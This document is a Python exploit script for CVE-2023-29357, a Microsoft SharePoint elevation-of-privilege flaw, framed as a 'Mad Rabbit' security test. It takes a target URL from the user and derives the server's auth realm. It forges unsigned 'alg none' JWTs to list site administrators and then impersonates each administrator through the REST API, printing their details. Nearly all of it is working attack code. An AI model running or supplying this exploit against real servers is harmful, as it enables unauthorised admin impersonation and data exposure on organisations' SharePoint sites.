#===========================#
# I M P O R T S             #
#===========================#

import base64
import json
import os
import pyfiglet
import requests
import sys
import time
from typing import Union, List, Dict
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#===========================#
# C O L O R S               #
#===========================#

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color") # Remove this line if you're running this on Linux

#===========================#

# Referenced from:
# - https://github.com/Chocapikk/CVE-2023-29357
class SharePoint:

    client_id = "00000003-0000-0ff1-ce00-000000000000"
    
    def __init__(self, url: str):

        self.url = url.rstrip('/')
        self.hostname = urlparse(url).hostname
        self.realm = self.get_realm()
        self.aud = self.construct_aud_field()

    def get_realm(self) -> str:

        headers = {"Authorization": "Bearer "}
        
        response = requests.get(self.url  + '/_api/web/siteusers', headers=headers, verify=False, timeout=5)

        if response.status_code != 401:
            return

        www_authenticate_header = response.headers.get('WWW-Authenticate', '')
        if www_authenticate_header:
            realm = None
            for header in www_authenticate_header.split(','):
                if 'realm="' in header:
                    try:
                        realm = header.split('realm="')[1].split('"')[0]
                        break 
                    except IndexError:
                        continue

        return realm

    def construct_aud_field(self) -> str:

        aud = f"{self.client_id}@{self.realm}"

        return aud

    def spoof_admin_users(self, admin_users: List[Dict[str, str]]) -> None:
        
        current_time = int(time.time())
        expiration_time = current_time + 3600

        for user in admin_users:

            payload = {
                "aud": self.aud,
                "iss": self.client_id,
                "nbf": current_time,
                "exp": expiration_time,
                "ver": "hashedprooftoken",
                "nameid": user.get("NameId", ""),
                "nii": user.get("NameIdIssuer", ""),
                "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
                "endpointurlLength": 1,
                "isloopback": True,
                "isuser": True
            }

            header = {"alg": "none"}
            encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
            encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
            
            jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"
            
            headers = {
                "Accept": "application/json",
                "Authorization": f"Bearer {jwt_token}",
                "X-PROOF_TOKEN": jwt_token,
            }

            endpoint_url = self.url.strip() + '/_api/web/currentuser'
            response = requests.get(endpoint_url, headers=headers, verify=False, timeout=5)
            if response.status_code == 200:

                try:
                    parsed_response = json.loads(response.text)
                    print(f"| Spoofing [{bcolors.OKGREEN}succeeded{bcolors.ENDC}] for " + user.get('Title', 'Unknown User') + f": " + user.get('Email', 'N/A') + f" at /_api/web/currentuser")
                    print(json.dumps(parsed_response, indent=4))

                except json.JSONDecodeError:
                    print(f"| Spoofing [{bcolors.OKGREEN}succeeded{bcolors.ENDC}] for " + user.get('Title', 'Unknown User') + f": " + user.get('Email', 'N/A') + f" at /_api/web/currentuser")
                    print(f"| Received non-JSON response: " + response.text)
            else:
                print(f"| Spoofing [{bcolors.FAIL}failed{bcolors.ENDC}] for " + user.get('Title', 'Unknown User') + f": " + user.get('Email', 'N/A') + f" at /_api/web/currentuser. Status code: [{bcolors.WARNING}" + str(response.status_code) + f"{bcolors.ENDC}]")

    def create_jwt_token(self) -> str:
        header = {"alg": "none"}
        current_time = int(time.time())
        expiration_time = current_time + 3600
        
        payload = {
            "aud": self.aud,
            "iss": self.client_id,
            "nbf": int(current_time),
            "exp": int(expiration_time),
            "ver": "hashedprooftoken",
            "nameid": f'{self.client_id}@{self.realm}',
            "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
            "endpointurlLength": 1,
            "isloopback": True
        }

        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

        jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"

        return jwt_token

    
    def authenticate_with_token(self, token: str) -> Union[bool, List[Dict[str, str]]]:

        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "X-PROOF_TOKEN": token,
        }

        response = requests.get(self.url + '/_api/web/siteusers', headers=headers, verify=False, timeout=5)

        if response.status_code == 200:
            try:
                parsed_response = json.loads(response.text)
                users = parsed_response.get('value', [])
                admin_users = [user for user in users if user.get('IsSiteAdmin', False) is True]
                admin_info_list = []
                
                for user in admin_users:
                    admin_info = {
                        "Title": user.get('Title', 'N/A'),
                        "Email": user.get('Email', 'N/A'),
                        "NameId": user.get('UserId', {}).get('NameId', 'N/A'),
                        "NameIdIssuer": user.get('UserId', {}).get('NameIdIssuer', 'N/A')
                    }
                    admin_info_list.append(admin_info)
                
                print(f"| Authenticated [{bcolors.OKGREEN}successfully{bcolors.ENDC}] for [{bcolors.WARNING}" + self.url + f"{bcolors.ENDC}]")
                if admin_users:
                    for admin_info in admin_info_list:
                        print(json.dumps(admin_info, indent=2))
                        print(f"=+" * 20)
                        
                return admin_info_list if admin_info_list else True
                
            except json.JSONDecodeError:
                print(f"| Authenticated [{bcolors.OKGREEN}successfully{bcolors.ENDC}] for [{bcolors.WARNING}" + self.url + f"{bcolors.ENDC}] but failed to parse the response text as JSON.")
                print(f"| Response Text: " + response.text)
                return True
            
        else:
            print(f"| Authentication [{bcolors.FAIL}failed{bcolors.ENDC}] for [{bcolors.WARNING}" + self.url + f"{bcolors.ENDC}]. Status code: [{bcolors.WARNING}" + str(response.status_code) + f"{bcolors.ENDC}]")
            return False

# Referenced from:
# - https://github.com/Chocapikk/CVE-2023-29357
def exploit(url):

    print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
    print(f"| ‚öîÔ∏è {bcolors.FAIL}CVE-2023-29357{bcolors.ENDC} ({bcolors.ORANGE}Microsoft SharePoint{bcolors.ENDC} Elevation of Privilege)")
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
    
    #===========================#

    try:
        sp = SharePoint(url)
        jwt_token = sp.create_jwt_token()
        authenticated = sp.authenticate_with_token(jwt_token)
        
        if authenticated:            
            if isinstance(authenticated, list):
                sp.spoof_admin_users(authenticated)
                
    except Exception as e:
        print(f"{bcolors.FAIL}Error: " + str(e) + f"{bcolors.ENDC}")
    
    #===========================#
    
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")

#===========================#

if __name__ == "__main__":
    
    #===========================#
    # Banner and art.
    #===========================#
    
    print("")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    print(f"   {bcolors.WARNING}A{bcolors.ENDC} [üêá {bcolors.ORANGE}Mad Rabbit{bcolors.ENDC}] {bcolors.WARNING}Security Test in the [‚öîÔ∏è {bcolors.CYAN}Achilles{bcolors.ENDC}] {bcolors.WARNING}Collection{bcolors.ENDC}:")
    ascii_banner = pyfiglet.figlet_format("  CVE-2023-29357", font="drpepper")
    print(f"{bcolors.WARNING}" + ascii_banner + f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")

    #===========================#
    # User input.
    #===========================#

    print(f"{bcolors.OKCYAN}=" * 75 + f"{bcolors.ENDC}")
    print(f"| üéØ {bcolors.WARNING}Target Input{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # Target input.
    domain = input(f"| Enter a [{bcolors.OKGREEN}URL{bcolors.ENDC}] to test: {bcolors.OKGREEN}")
    print(f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # If no domain was entered, exit.
    if (domain == "" or domain == " "):
    
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");
        print(f"| No domain entered. Press any key to exit.")
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");

        end = input("")
        sys.exit()
    
    # Sanitize the input.
    domain = domain.strip().lower()
    
    # If it's missing http://, add it in by default.
    if "http://" not in domain:
        domain = "http://" + domain
        print(f"| -> Did not specify full URL, so adding [{bcolors.OKGREEN}http://{bcolors.ENDC}].")
    
    #===========================#
    
    print(f"| Testing [{bcolors.OKGREEN}"+domain+f"{bcolors.ENDC}]...")
    
    exploit(domain)